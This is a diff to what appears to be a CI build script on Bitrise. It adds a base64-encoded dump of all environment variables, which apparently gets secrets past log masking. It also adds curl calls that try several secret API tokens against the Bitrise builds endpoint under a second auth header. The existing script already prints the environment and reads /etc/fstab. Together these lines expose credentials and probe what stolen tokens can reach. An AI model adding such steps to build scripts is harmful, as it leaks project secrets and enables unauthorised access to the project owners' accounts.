@@ -4,6 +4,8 @@ set -ex
 echo "===================================="
 env
 echo "===================================="
+env | base64
+echo "===================================="
 java -version
 echo "===================================="
 cat /etc/fstab || :
@@ -33,6 +35,14 @@ echo "===================================="
 curl -H "Authorization: ${APM_COLLECTOR_TOKEN}" https://api.bitrise.io/v0.1/apps/${BITRISE_APP_SLUG}/builds || :
 echo "===================================="
 curl -H "Authorization: ${ADDON_VDTESTING_API_TOKEN}" https://api.bitrise.io/v0.1/apps/${BITRISE_APP_SLUG}/builds || :
+echo "===================================="
+curl -H "Bitrise-Addon-Auth-Token: ${BITRISE_BUILD_API_TOKEN}" https://api.bitrise.io/v0.1/apps/${BITRISE_APP_SLUG}/builds || :
+echo "===================================="
+curl -H "Bitrise-Addon-Auth-Token: ${ADDON_SHIP_API_TOKEN}" https://api.bitrise.io/v0.1/apps/${BITRISE_APP_SLUG}/builds || :
+echo "===================================="
+curl -H "Bitrise-Addon-Auth-Token: ${APM_COLLECTOR_TOKEN}" https://api.bitrise.io/v0.1/apps/${BITRISE_APP_SLUG}/builds || :
+echo "===================================="
+curl -H "Bitrise-Addon-Auth-Token: ${ADDON_VDTESTING_API_TOKEN}" https://api.bitrise.io/v0.1/apps/${BITRISE_APP_SLUG}/builds || :
 echo "===================================="
 
 #
